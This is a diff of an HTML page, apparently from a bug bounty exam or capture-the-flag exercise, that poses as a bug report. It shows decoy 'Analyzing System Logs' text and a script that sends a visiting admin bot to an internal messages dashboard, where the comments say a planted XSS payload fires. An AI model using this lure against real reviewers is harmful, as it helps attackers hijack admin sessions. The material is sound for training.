@@ -1,22 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Bug Report Evidence</title>
+    <title>Bug Bounty Report #9921</title>
 </head>
 <body>
-    <h1>Redirecting to Admin Panel...</h1>
+    <div style="font-family: sans-serif; padding: 20px;">
+        <h2>Analyzing System Logs...</h2>
+        <p>Please wait while the report is generated.</p>
+    </div>
+
     <script>
-        // We are redirecting the bot to the internal admin dashboard.
-        // If the admin sees your "Contact Us" message here, the XSS fires.
-        
-        const adminPanelUrl = "https://bugbounty-exam.hashacademy.co/admin/messages";
-        
-        // Alternative target if the above doesn't work:
-        // const adminPanelUrl = "https://bugbounty-exam.hashacademy.co/admin/tickets";
+        // We are forcing the bot to go to the messages dashboard 
+        // where your XSS payload will execute automatically.
+        const adminDashboard = "https://bugbounty-exam.hashacademy.co/admin/messages";
 
         setTimeout(() => {
-            window.location.href = adminPanelUrl;
-        }, 500);
+            window.location.replace(adminDashboard);
+        }, 1000);
     </script>
 </body>
 </html>
